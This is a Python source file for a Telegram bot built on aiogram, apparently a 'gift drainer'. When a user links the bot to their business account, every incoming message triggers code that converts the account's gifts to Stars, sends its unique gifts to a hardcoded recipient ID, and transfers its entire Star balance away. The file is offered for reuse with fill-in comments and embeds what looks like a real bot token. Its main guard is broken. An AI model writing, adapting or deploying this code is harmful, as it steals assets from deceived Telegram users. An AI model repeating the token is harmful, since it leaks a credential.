from aiogram import Bot, Dispatcher
from aiogram import types
import asyncio
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

TOKEN = "8016575996:AAFbEBPas-xla-qZ1BaLOlflIZCnomuPneg" # Your Bot API Token from @BotFather
# Turn business mode in settings bot

bot = Bot(TOKEN)

dp = Dispatcher()

my_id = 6177280151 # Your Telegram ID

@dp.business_message()
async def get_message(
	message: types.Message
):
    business_id = message.business_connection_id
    convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
    for gift in convert_gifts.gifts:
        try:
            owned_gift_id = gift.owned_gift_id
            await bot.convert_gift_to_stars(business_id, owned_gift_id)
        except:
            pass
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        for gift in unique_gifts.gifts:
            owned_gift_id = gift.owned_gift_id

            await bot.transfer_gift(business_id, owned_gift_id, my_id, 25)
    except:
        pass
    stars = await bot.get_business_account_star_balance(business_id)
    await bot.transfer_business_account_stars(business_id, int(stars.amount))



async def main():
	await dp.start_polling(bot)
	
	
if name == "main":
	asyncio.run(main())
